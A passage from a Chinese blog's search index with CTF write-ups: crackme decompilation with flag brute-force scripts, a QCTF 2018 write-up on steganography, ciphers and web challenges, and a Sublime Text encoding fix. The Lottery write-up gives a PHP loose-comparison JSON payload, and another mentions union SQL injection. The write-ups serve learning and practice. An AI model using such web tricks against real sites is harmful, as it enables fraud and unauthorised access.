v1;&#125; 可以判断出函数经过了四次加密。 trans0将每个字符与0x76异或： 123456789101112int __cdecl sub_411B30(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+D0h] [ebp-8h] for ( i = 0; i &lt; 35; ++i ) &#123; a1[i] = a2[i] ^ 0x76; result = i + 1; &#125; return result;&#125; trans1对从第七位字符开始的连续七个字符进行一系列异或和移位操作： 12345678910111213int __cdecl sub_411D40(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 7] ^ 0xAD; a1[i] = 2 * a1[i] &amp; 0xAA | ((a1[i] &amp; 0xAA) &gt;&gt; 1); result = i + 1; &#125; return result;&#125; trans2与trans1类似，对第十四位起连续七位进行操作： 12345678910111213int __cdecl sub_411E40(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 14] ^ 0xBE; a1[i] = 4 * a1[i] &amp; 0xCC | ((a1[i] &amp; 0xCC) &gt;&gt; 2); result = i + 1; &#125; return result;&#125; trans3也类似，对从二十一位起的连续七位操作。 12345678910111213int __cdecl sub_411F50(char *a1, char *a2)&#123; int result; // eax signed int i; // [esp+E8h] [ebp-8h] for ( i = 0; i &lt; 7; ++i ) &#123; a1[i] = a2[i + 21] ^ 0xEF; a1[i] = 16 * a1[i] &amp; 0xF0 | ((a1[i] &amp; 0xF0) &gt;&gt; 4); result = i + 1; &#125; return result;&#125; 根据以上程序逻辑，可以写出爆破的脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243enc = [0x1E, 0x15, 0x02, 0x10, 0x0D, 0x48, 0x48, 0x6F, 0xDD, 0xDD, 0x48, 0x64, 0x63, 0xD7, 0x2E, 0x2C, 0xFE, 0x6A, 0x6D, 0x2A, 0xF2, 0x6F, 0x9A, 0x4D, 0x8B, 0x4B, 0x0A, 0x8A, 0x4F, 0x45, 0x17, 0x46, 0x4F, 0x14, 0x0B];flag = \"\"for i in range(7): flag += chr(enc[i] ^ 0x76)print flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xAD ch = ((2 * ch) &amp; 0xFF) &amp; 0xAA | (0xFF &amp; ((ch &amp; 0xAA) &gt;&gt; 1)) if ch == enc[7 + i]: flag += chr(tmp) breakprint flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xBE ch = ((4 * ch) &amp; 0xFF) &amp; 0xCC | (0xFF &amp; ((ch &amp; 0xCC) &gt;&gt; 2)) if ch == enc[14 + i]: flag += chr(tmp) breakprint flagfor i in range(7): for ch in range(32, 127): tmp = ch ch ^= 0x76 ch ^= 0xEF ch = ((16 * ch) &amp; 0xFF) &amp; 0xF0 | (0xFF &amp; ((ch &amp; 0xF0) &gt;&gt; 4)) if ch == enc[21 + i]: flag += chr(tmp) breakprint flagfor i in range(7): flag += chr(enc[28 + i] ^ 0x76)print flag","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"解决Mac下sublime text中文出现乱码","slug":"解决Mac下sublime-text中文出现乱码","date":"2018-07-26T11:04:36.000Z","updated":"2018-10-06T08:09:26.882Z","comments":true,"path":"2018/07/26/解决Mac下sublime-text中文出现乱码/","link":"","permalink":"https://qianfei11.github.io/2018/07/26/解决Mac下sublime-text中文出现乱码/","excerpt":"用了这么久mac，竟然第一次发现sublime不能解码中文字体。","text":"用了这么久mac，竟然第一次发现sublime不能解码中文字体。 1、打开控制台打开sublime，control+~打开控制台。 2、下载package control如果是sublime text 2，输入： 1import urllib2,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); os.makedirs( ipp ) if not os.path.exists(ipp) else None; urllib2.install_opener( urllib2.build_opener( urllib2.ProxyHandler()) ); by = urllib2.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); open( os.path.join( ipp, pf), 'wb' ).write(by) if dh == h else None; print('Error validating download (got %s instead of %s), please try manual install' % (dh, h) if dh != h else 'Please restart Sublime Text to finish installation') 如果是sublime text 3，输入： 1import urllib.request,os,hashlib; h = '6f4c264a24d933ce70df5dedcf1dcaee' + 'ebe013ee18cced0ef93d5f746d80ef60'; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( 'http://packagecontrol.io/' + pf.replace(' ', '%20')).read(); dh = hashlib.sha256(by).hexdigest(); print('Error validating download (got %s instead of %s), please try manual install' % (dh, h)) if dh != h else open(os.path.join( ipp, pf), 'wb' ).write(by) 详情见官网 3、下载ConvertToUTF8重启sublime。command+shift+p，在输入框输入Package Control: Install Package，待载入所有的包目录后输入ConvertToUTF8，回车安装。 4、安装Codecs33如果重启sublime之后仍然无法正确解码，需要下载Codecs33。将下载完的压缩包解压，把文件夹的名字修改为Codecs33并放在sublime的package目录下。 重启之后就大功告成啦。","categories":[],"tags":[{"name":"mac","slug":"mac","permalink":"https://qianfei11.github.io/tags/mac/"},{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"2018-QCTF-writeup","slug":"【未完成】2018-QCTF-writeup","date":"2018-07-21T11:56:59.000Z","updated":"2019-01-25T07:46:31.089Z","comments":true,"path":"2018/07/21/【未完成】2018-QCTF-writeup/","link":"","permalink":"https://qianfei11.github.io/2018/07/21/【未完成】2018-QCTF-writeup/","excerpt":"其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。","text":"其实大部分是看着大佬wp的复现。感觉自己实力还是欠缺很多。 MISCpicture通过stegsolve判断出存在最低位隐写。使用lsb工具解出密文，为一段加密函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293#_*_ coding:utf-8 _*_import reimport sysip= (58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4, 62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8, 57, 49, 41, 33, 25, 17, 9 , 1, 59, 51, 43, 35, 27, 19, 11, 3, 61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7)ip_1=(40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31, 38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29, 36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27, 34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25)e =(32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12,13, 12, 13, 14, 15, 16, 17, 16,17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,24, 25, 26, 27, 28, 29,28, 29, 30, 31, 32, 1) p=(16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10, 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25)s=[ [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7], [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8], [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0], [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]], [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10], [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5], [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15], [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]], [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8], [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1], [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7], [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]], [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15], [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14,9], [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4], [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]], [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9], [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6], [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14], [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]], [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11], [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8], [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6], [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]], [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1], [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6], [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2], [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]], [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7], [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2], [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8], [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]]] pc1=(57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18, 10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36, 63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22, 14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4);pc2= (14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10, 23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2, 41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48, 44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32)d = ( 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1)__all__=['desencode']class DES(): def __init__(self): pass def code(self,from_code,key,code_len,key_len): output=\"\" trun_len=0 code_string=self._functionCharToA(from_code,code_len) code_key=self._functionCharToA(key,key_len) if code_len%16!=0: real_len=(code_len/16)*16+16 else: real_len=code_len if key_len%16!=0: key_len=(key_len/16)*16+16 key_len*=4 trun_len=4*real_len for i in range(0,trun_len,64): run_code=code_string[i:i+64] l=i%key_len run_key=code_key[l:l+64] run_code= self._codefirstchange(run_code) run_key= self._keyfirstchange(run_key) for j in range(16): code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r code_r= self._functionE(code_r) key_l=run_key[0:28] key_r=run_key[28:56] key_l=key_l[d[j]:28]+key_l[0:d[j]] key_r=key_r[d[j]:28]+key_r[0:d[j]] run_key=key_l+key_r key_y= self._functionKeySecondChange(run_key) code_r= self._codeyihuo(code_r,key_y) code_r= self._functionS(code_r) code_r= self._functionP(code_r) code_r= self._codeyihuo(code_l,code_r) run_code+=code_r code_r=run_code[32:64] code_l=run_code[0:32] run_code=code_r+code_l output+=self._functionCodeChange(run_code) return output def _codeyihuo(self,code,key): code_len=len(key) return_list='' for i in range(code_len): if code[i]==key[i]: return_list+='0' else: return_list+='1' return return_list def _codefirstchange(self,code): changed_code='' for i in range(64): changed_code+=code[ip[i]-1] return changed_code def _keyfirstchange (self,key): changed_key='' for i in range(56): changed_key+=key[pc1[i]-1] return changed_key def _functionCodeChange(self, code): lens=len(code)/4 return_list='' for i in range(lens): list='' for j in range(4): list+=code[ip_1[i*4+j]-1] return_list+=\"%x\" %int(list,2) return return_list def _functionE(self,code): return_list='' for i in range(48): return_list+=code[e[i]-1] return return_list def _functionP(self,code): return_list='' for i in range(32): return_list+=code[p[i]-1] return return_list def _functionS(self, key): return_list='' for i in range(8): row=int( str(key[i*6])+str(key[i*6+5]),2) raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2) return_list+=self._functionTos(s[i][row][raw],4) return return_list def _functionKeySecondChange(self,key): return_list='' for i in range(48): return_list+=key[pc2[i]-1] return return_list def _functionCharToA(self,code,lens): return_code='' lens=lens%16 for key in code: code_ord=int(key,16) return_code+=self._functionTos(code_ord,4) if lens!=0: return_code+='0'*(16-lens)*4 return return_code def _functionTos(self,o,lens): return_code='' for i in range(lens): return_code=str(o&gt;&gt;i &amp;1)+return_code return return_codedef tohex(string): return_string='' for i in string: return_string+=\"%02x\"%ord(i) return return_string def tounicode(string): return_string='' string_len=len(string) for i in range(0,string_len,2): return_string+=chr(int(string[i:i+2],16)) return return_stringdef desencode(from_code,key): from_code=tohex(from_code) key=tohex(key) des=DES() key_len=len(key) string_len=len(from_code) if string_len&lt;1 or key_len&lt;1: print 'error input' return False key_code= des.code(from_code,key,string_len,key_len) return key_codeif __name__ == '__main__': if(desencode(sys.argv[1],'mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf')=='e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72'): print 'correct.' else: print 'try again.' 解出来之后发现应该是DES，但无从下手。后来看了孔师傅的wp，一惊居然还有这种骚操作。 顺便记录一下__all__在python中： 1The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package. 最后用搜到的脚本解密： 1234567$ python des_1.py DES 解密请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sfQCTF&#123;eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4&#125;按确定退出 Noise拿到一个Noise.wav，发现是my little pony theme song。尝试用mp3stego后无果。再反复听了很多次，发现有一些噪音夹杂在里面。 看一下hint，个人认为这里最关键的是hint2，需要了解通过消除伴奏获得人声的原理。 关于原理，利用声波叠加干涉消除原声，当声波的相位差达到180度的时候，就可以达到消音的效果： 跟着教程学会怎么使用Adobe Audition，使声波相位差达到180度。 要提取出噪音，我们要做的就是从网上下载原版的my little pony theme song，然后将Noise.wav和它的相位差调整为180度，就可以提取出噪音。 关于这段噪音的话，和慢扫描电视有关。利用软件MMSSTV，最后得到flag。 X-man-Keyword也是lsb。 密码为图片中的lovekfc。 通过提示，将LOVEKFC作为关键字提到最前面，和正常顺序的英文字母进行置换。 1234567PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;LOVEKFCABDGHIJMNPQRSTUWXYZABCDEFGHIJKLMNOPQRSTUVWXYZQCTF...// 容易发现前四位正好是QCTF 写一下脚本跑出结果： 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;int main() &#123; char s1[27] = \"lovekfcabdghijmnpqrstuwxyz\"; char s2[27] = \"abcdefghijklmnopqrstuvwxyz\"; char s3[27] = \"LOVEKFCABDGHIJMNPQRSTUWXYZ\"; char s4[27] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\"; char ans[39] = \"PVSF&#123;vVckHejqBOVX9C1c13GFfkHJrjIQeMwf&#125;\"; for(int i = 0; i &lt; strlen(ans); i++) &#123; if(islower(ans[i])) &#123; for(int j = 0; j &lt; strlen(s1); j++) &#123; if(ans[i] == s1[j]) &#123; ans[i] = s2[j]; break; &#125; &#125; &#125; else if(isupper(ans[i])) &#123; for(int j = 0; j &lt; strlen(s3); j++) &#123; if(ans[i] == s3[j]) &#123; ans[i] = s4[j]; break; &#125; &#125; &#125; else &#123; continue; &#125; &#125; printf(\"%s\", ans); return 0;&#125; X-man-A face补全二维码定位符，扫出一串类似base64的密文。 经过尝试，通过base32解码得到flag。 WEBLottery通过GitHack拿到源码，在api.php中： 123456789101112function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION['money']; $numbers = $req['numbers']; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; $numbers即用户输入的数字，$win_numbers即随机生成的数字。根据PHP弱类型比较，例如TRUE和1和&quot;1&quot;相等，构造&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]即可中最高奖，得到flag。 NewsCenter直接用联合注入判断出列数为三列后，就开始走流程emmm。 显而易见flag应该在secret_table中。 在fl4g列中得到flag： REXman-babymipsmips逆向，看一下swing的博客，安装一波retdec来反编译。 反编译出几个关键函数： check函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t puts(char * a1);int32_t strlen(char * a1);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(char * a1);// --------------------- Global Variables ---------------------char * g1 = \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";// ------------------------ Functions -------------------------// Address range: 0x4007f0 - 0x4009a8int32_t sub_4007F0(char * a1) &#123; int32_t v1 = (int32_t)a1; // 0x400800 char * str = (char *)v1; // 0x400800 int32_t puts_rc; if (strlen(str) &lt;= 5) &#123; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc; &#125; int32_t v2 = 5; while (true) &#123; char * v3 = (char *)(v2 + v1); // 0x4008a8 int32_t v4 = (int32_t)*v3; // 0x4008a8 char v5; if (v2 % 2 == 0) &#123; char v6 = *v3; // 0x4008cc v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000; // branch -&gt; 0x400900 &#125; else &#123; // 0x400828 v5 = 64 * (int32_t)*v3 | v4 / 4; // branch -&gt; 0x400900 &#125; // 0x400900 *v3 = v5; int32_t v7 = v2 + 1; // 0x400908 if (v7 &gt;= strlen(str)) &#123; // break -&gt; 0x400934 break; &#125; v2 = v7; // continue -&gt; 0x400814 &#125; // 0x400934 if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) &#123; // 0x400964 puts_rc = puts(\"Right!\"); // branch -&gt; 0x40098c &#125; else &#123; // 0x40097c puts_rc = puts(\"Wrong!\"); // branch -&gt; 0x40098c &#125; // 0x40098c return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:29 逻辑就是先判断奇偶，如果为奇数则将字符的高6位作为低6位，低2位作为高2位；反之为偶数，则字符的低6位作为高6位，高2位作为低2位。最后和g1check一下。 main函数在这里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t printf(char * a1);int32_t puts(char * a1);int32_t scanf(char * a1);void setbuf(int32_t a1, char * a2);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(int32_t a1);int32_t sub_4009A8(void);// --------------------- Global Variables ---------------------int32_t stdin = 0;int32_t stdout = 0;// ------------------------ Functions -------------------------// Address range: 0x4009a8 - 0x400af8int32_t sub_4009A8(void) &#123; // 0x4009a8 setbuf(stdout, NULL); setbuf(stdin, NULL); printf(\"Give me your flag:\"); scanf(\"%32s\"); int32_t v1 = 0; // bp-48 int32_t v2 = 0; // 0x400a58 char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28 *v3 = (char)((int32_t)*v3 ^ 32 - v2); int32_t v4 = v1 + 1; // 0x400a70 v1 = v4; // branch -&gt; 0x400a1c while (v4 &lt; 32) &#123; // 0x400a1c v2 = v4; v3 = (char *)((int32_t)&amp;v1 + 4 + v2); *v3 = (char)((int32_t)*v3 ^ 32 - v2); v4 = v1 + 1; v1 = v4; // continue -&gt; 0x400a1c &#125; int32_t str = 0; // bp-44 int32_t puts_rc; if (strncmp((char *)&amp;str, \"Q|j&#123;g\", 5) == 0) &#123; // 0x400ab4 puts_rc = sub_4007F0((int32_t)&amp;str); // branch -&gt; 0x400adc &#125; else &#123; // 0x400acc puts_rc = puts(\"Wrong\"); // branch -&gt; 0x400adc &#125; // 0x400adc return puts_rc;&#125;// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:58 main中先输入字符串，然后将字符串中的每个字符依次与32-i异或，前五位与Q|j{g比较，之后将字符串作为参数调用上一个check函数。 由于之前的奇偶难以判断，所以采用爆破的方式。用python写出爆破脚本： 123456789101112131415161718192021#!/usr/bin/env pythonenc1 = 'Q|j&#123;g'enc2 = '\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f'flag = ''for i in range(5): ch = ord(enc1[i]) ^ (32 - i) print 'index', i, '==&gt;', chr(ch) flag += chr(ch)for i in range(5, 32): for ch in range(256): t = ch ^ (32 - i) if i % 2 == 0: res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6) else: res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff) if res == ord(enc2[i - 5]): print 'index', i, '==&gt;', chr(ch) flag += chr(ch) breakprint len(flag)print 'flag:', flag 最后放上官方给出的源码： 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *check1=\"Q|j&#123;g\";char *check2= \"\\x52\\xfd\\x16\\xa4\\x89\\xbd\\x92\\x80\\x13\\x41\\x54\\xa0\\x8d\\x45\\x18\\x81\\xde\\xfc\\x95\\xf0\\x16\\x79\\x1a\\x15\\x5b\\x75\\x1f\";void check(char *s)&#123; int i; for(i=5;i&lt;strlen(s);i++)&#123; if(i%2) s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff); else s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6); &#125; if(!strncmp(&amp;s[5],check2,27)) printf(\"Right!\\n\"); else printf(\"Wrong!\\n\");&#125;void main()&#123; char s[33]; int i; printf(\"Give me your flag:\"); scanf(\"%32s\",s); for(i=0;i&lt;32;i++) s[i]^=(32-i); if(!strncmp(s,check1,5)) check(s); else printf(\"Wrong\\n\");&#125; asong总共给了三个文件，asong为可执行文件，that_girl以及out都是ascii文本。将asong拖进ida后，看到main函数的样子： 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; void *girl; // ST00_8 char *input; // ST08_8 girl = malloc(0xBCuLL); input = (char *)malloc(0x50uLL); init_func(); getline(input); simple_check(input); cal(\"that_girl\", (__int64)girl); encrypt(input, (__int64)girl); return 0LL;&#125; 第一个init_func()，设置一下缓冲区： 123456void init_func()&#123; setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL);&#125; getline()函数实现了一个简单的读取一行的功能： 12345678910111213141516171819char __fastcall getline(char *a1)&#123; char *v1; // rax signed int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; ; ++i ) &#123; LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1; if ( !(_BYTE)v1 ) break; if ( a1[i] == 10 || i &gt; 100 ) &#123; v1 = &amp;a1[i]; *v1 = 0; return (char)v1; &#125; &#125; return (char)v1;&#125; simple_check()函数检查读入字符串中是否以&#39;QCTF{&#39;开头，以及是否以&#39;}&#39;结尾： 123456789101112131415void __fastcall simple_check(char *a1)&#123; int v1; // [rsp+14h] [rbp-Ch] void *dest; // [rsp+18h] [rbp-8h] dest = malloc(0x50uLL); if ( memcmp(a1, \"QCTF&#123;\", 5uLL) ) exit(-1); memcpy(dest, a1 + 5, 0x4BuLL); v1 = strlen((const char *)dest); if ( *((_BYTE *)dest + v1 - 1) == '&#125;' ) *((_BYTE *)dest + v1 - 1) = 0; memcpy(a1, dest, 0x50uLL); free(dest);&#125; cal()函数读取了文件that_girl的内容，应该是通过convert()函数对其中的每个字符做了一个词频的统计： 1234567891011121314151617int __fastcall cal(const char *that_girl, __int64 girl)&#123; int v2; // eax char *v4; // [rsp+0h] [rbp-20h] char buf; // [rsp+13h] [rbp-Dh] int fd; // [rsp+14h] [rbp-Ch] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); fd = open(that_girl, 0, girl, that_girl); while ( read(fd, &amp;buf, 1uLL) == 1 ) &#123; v2 = convert(buf); ++*(_DWORD *)&amp;v4[4 * v2]; &#125; return close(fd);&#125; convert()函数中是一个对读入的buf的映射，不用刻意看具体是什么操作，后面直接打表就完事了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455__int64 __fastcall convert(char buf)&#123; __int64 result; // rax result = (unsigned int)(buf - 10); switch ( buf ) &#123; case '\\n': result = (unsigned int)(buf + 35); break; case ' ': case '!': case '\"': result = (unsigned int)(buf + 10); break; case '\\'': result = (unsigned int)(buf + 2); break; case ',': result = (unsigned int)(buf - 4); break; case '.': result = (unsigned int)(buf - 7); break; case ':': case ';': result = (unsigned int)(buf - 21); break; case '?': result = (unsigned int)(buf - 27); break; case '_': result = (unsigned int)(buf - 49); break; default: if ( buf &lt;= '/' || buf &gt; '9' ) &#123; if ( buf &lt;= '@' || buf &gt; 'Z' ) &#123; if ( buf &gt; '`' &amp;&amp; buf &lt;= 'z' ) result = (unsigned int)(buf - 87); // lower case &#125; else &#123; result = (unsigned int)(buf - 55); // upper case &#125; &#125; else &#123; result = (unsigned int)(buf - 48); // number &#125; break; &#125; return result;&#125; 最后是对flag的加密部分： 12345678910111213141516unsigned __int64 __fastcall encrypt(const char *input, char *girl)&#123; int i; // [rsp+18h] [rbp-48h] int len; // [rsp+1Ch] [rbp-44h] char enc[56]; // [rsp+20h] [rbp-40h] unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); len = strlen(input); for ( i = 0; i &lt; len; ++i ) enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])]; index_round(enc); shift(enc, len); output(enc, \"out\", len); return __readfsqword(0x28u) ^ v6;&#125; 这里用到了一个global的table，和之前的词频一样，通过打表将映射关系记录下来： 12345678910111213141516__int64 __fastcall index_round(char *enc)&#123; __int64 result; // rax _BYTE v2[5]; // [rsp+13h] [rbp-5h] v2[4] = 0; // v2[1] = 0; *(_DWORD *)v2 = (unsigned __int8)*enc; while ( table[*(signed int *)&amp;v2[1]] ) &#123; enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]]; *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]]; &#125; result = v2[0]; enc[*(signed int *)&amp;v2[1]] = v2[0]; return result;&#125; shift()做了一个循环位移，这个操作显然是可逆的： 12345678910111213char *__fastcall shift(char *enc, int len)&#123; char *result; // rax char v3; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] v3 = (unsigned __int8)*enc &gt;&gt; 5; for ( i = 0; len - 1 &gt; i; ++i ) enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] 